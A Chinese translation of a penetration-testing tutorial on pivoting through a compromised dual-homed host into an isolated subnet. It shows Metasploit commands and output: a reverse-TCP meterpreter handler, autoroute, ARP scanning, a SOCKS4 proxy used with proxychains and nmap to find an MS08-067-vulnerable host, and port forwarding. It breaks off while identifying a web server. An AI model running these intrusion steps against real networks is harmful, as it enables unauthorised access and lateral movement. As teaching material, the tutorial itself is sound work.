# **原创翻译者：sanwenkit**

根据纵深防御原则，重要服务通常通过多层安全架构进行保护。如果将这一原则应用于组织内部网络，我们会发现关键系统几乎不会与其他系统存在于同一网络中。本文将探讨攻击者如何通过跳板对最初无法直接访问的深层内网进行渗透。

## 什么是路由
路由是指设备在不同网络间进行通信的决策过程。通常，路由由路由器实施，路由器通过路由表将数据包转发到目标地址。路由规则不仅可以在路由器等网络设备中实施，也可以在安装了操作系统的主机上配置。

### 示例
为了成功地在192.168.1.0/24和192.168.10.0/24两个不同网段之间通信，需要一条路由表记录。根据路由器中的定义，192.168.1.0/24网段可以作为源地址访问192.168.10.0/24网段中的目标地址。

一个数据包的传输路径如下：
1. 检查IP地址是否在本地网络中。
   - 如果在本地网络中，直接到达目标地址。
   - 如果不在本地网络中，发送至网关。
2. 路由器接收到数据包后，查询其路由表，查找匹配目标地址或目标地址网段的路由规则。
   - 如果有匹配项，将数据包转发至目标地址。
   - 如果没有匹配项，继续发送至上层网关。
3. 这一过程在其他路由器中不断重复。
4. 数据包最终可能到达具有外网出口的路由器，并被发送至外网。

## 什么是跳板
简单来说，跳板是一种通过使用中间主机来访问隔离网段的过程。当攻击者控制了一台能够访问多个不同网段的跳板主机时，网络隔离就失效了。通过这种方法，攻击者可以在跳板机上实施路由来访问隔离网段。每个发送到隔离网段的请求都需要通过端口转发，类似于隧道（tunnel）。

### 示例拓扑结构
有一台设备配置了两块网卡，能够同时访问192.168.1.0/24和192.168.10.0/24两个不同网段。通常情况下，这两个网段是隔离的，除非配置了路由规则。但在当前情况下，这台双网卡设备的用户可以访问DMZ区域中的设备。

## 构建第一个跳板和端口转发
在我们的攻击场景中，攻击者获取了DMZ区域内一台名为RD的设备的控制权限（meterpreter shell）。随后通过信息收集发现，这台设备拥有双网卡。

### 当前环境
- 路由器中不存在网段间的路由规则。

```plaintext
msf > use exploit/multi/handler 
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.0.20 
LHOST => 172.16.0.20
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > run
[*] Started reverse TCP handler on 172.16.0.20:1234 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.0.11
[*] Meterpreter session 2 opened (172.16.0.20:1234 -> 172.16.0.11:49162)
```

```plaintext
meterpreter > ifconfig
Interface  1
===========
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

Interface 11
===========
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:e1:3f:af
MTU          : 1500
IPv4 Address : 172.16.0.11
IPv4 Netmask : 255.255.255.0

Interface 19
===========
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:7f:3c:fe
MTU          : 1500
IPv4 Address : 7.7.7.11
IPv4 Netmask : 255.255.255.0
```

攻击者想要访问第二块网卡的网段（7.7.7.0/24），首先需要在RD系统中定义一条路由规则。

```plaintext
meterpreter > run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p
Active Routing Table
====================
 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 2
```

根据定义的规则，在ID为2的meterpreter会话生命周期内，7.7.7.0/24网段能够被Metasploit框架访问。

通过使用“arp_scanner”之类的后攻击模块，攻击者发现了主机JC的IP地址（7.7.7.20）。

```plaintext
meterpreter > run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24
[*] Running module against DISCORDIA
[*] ARP Scanning 7.7.7.0/24
[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
[*]     IP: 7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)
```

现在，在7.7.7.0/24网段中的存活主机IP地址，包括JC主机，都已经被发现。

### 使用NMAP进行扫描
为了实现nmap扫描，需要激活Metasploit中的路由配置并通过SOCKS4代理进行流量转发。

#### 启用SOCKS4代理
```plaintext
meterpreter > background 
[*] Backgrounding session 2...
msf > use auxiliary/server/socks4a 
msf auxiliary(socks4a) > show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) > set srvhost 172.16.0.20
srvhost => 172.16.0.20
msf auxiliary(socks4a) > run
[*] Auxiliary module execution completed
[*] Starting the socks4a proxy server
msf auxiliary(socks4a) > netstat -antp | grep 1080
[*] exec: netstat -antp | grep 1080
tcp        0      172.16.0.20:1080            0.0.0.0:*               LISTEN      3626/ruby       
msf auxiliary(socks4a) >
```

#### 配置ProxyChains
使用GNU/Linux操作系统内置的 **ProxyChains** 工具，任何TCP连接都可以通过TOR、SOCKS4、SOCKS、HTTP/HTTPS等代理方式进行转发。在这项隧道技术中，可以嵌套多层代理。除了提供匿名性外，如跳板机这样的利用也能实现向隔离的内部网络导入流量。

编辑文件 `/etc/proxychains.conf`，在最后一行加入SOCKS4代理的配置信息。

```plaintext
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks4  172.16.0.20 1080
```

通过ProxyChains执行nmap扫描是一个简单的操作。流量包会通过定义的代理端口被导入到目标网络。

```plaintext
root@kali:~# proxychains nmap -sT -sV -Pn -n -p22,80,135,139,445 --script=smb-vuln-ms08-067.nse 7.7.7.20
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.25BETA1 ( https://nmap.org )
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:80-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:22-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:139-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:135-<><>-OK
|S-chain|-<>-172.16.0.20:1080-<><>-7.7.7.20:445-<><>-OK
Nmap scan report for 7.7.7.20
Host is up (0.17s latency).
PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          Bitvise WinSSHD 7.16 (FlowSsh 7.15; protocol 2.0)
80/tcp   closed   http         Easy File Sharing Web Server httpd 6.9
135/tcp  open     msrpc        Microsoft Windows RPC
139/tcp  open     netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds Microsoft Windows 2003 or 2008 microsoft-ds
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs: CVE:CVE-2008-4250
|          The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, 
|          Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary 
|          code via a crafted RPC request that triggers the overflow during path canonicalization.
| 
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds
root@kali:~#
```

根据扫描结果，目标主机上存在SSH和HTTP服务。在进行进一步利用之前，我们将介绍端口转发技术。

## 端口转发
端口转发是实现跳板的一项基本步骤。对于内部隔离网络中的服务（如Web服务器），直接访问通常是不可行的，因为没有配置双向路由。我们知道如何让请求到达目标系统，但由于目标系统不知道如何访问我们，请求最终会失败。

为此，我们在自己的系统中创建一个到目标网络的路由端口。这个路由的生命周期仅限于路由端口进程的运行期间。

另外需要注意的一点是，在Metasploit框架中使用 `run autoroute` 命令创建路由规则后，还需要通过端口转发或 **ProxyChains** 之类的工具才能使Kali中的系统工具访问到目标网络。

端口转发可以通过Metasploit中的 `portfwd` 后攻击模块来实施。

```plaintext
meterpreter > portfwd -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -L   Forward: local host to listen on (optional). Remote: local host to connect to.
    -R        Indicates a reverse port forward.
    -h        Help banner.
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
meterpreter >
```

当我们使用自己的浏览器访问本地2323端口时，这个连接请求会被转发到IP地址7.7.7.20的80端口。

此前通过nmap和ProxyChains，我们已经发现7.7.7.20的主机在TCP 80端口运行了Web服务。为了能够访问这个服务，本地系统的2323端口应该被路由至7.7.7.20的80端口。

```plaintext
meterpreter > portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20
[*] Local TCP relay created: 172.16.0.20:2323  7.7.7.20:80
meterpreter >
```

激活的转发规则可以通过 `portfwd list` 命令查看。

```plaintext
meterpreter > portfwd list
Active Port Forwards
====================
   Index  Local             Remote       Direction
   -----  -----             ------       ---------
   1      172.16.0.20:2323  7.7.7.20:80  Forward
1 total active port forwards.
meterpreter >
```

识别运行在7.7.7.20主机80端口的应用，发现这是一个 **Easy File Sharing Web Server**。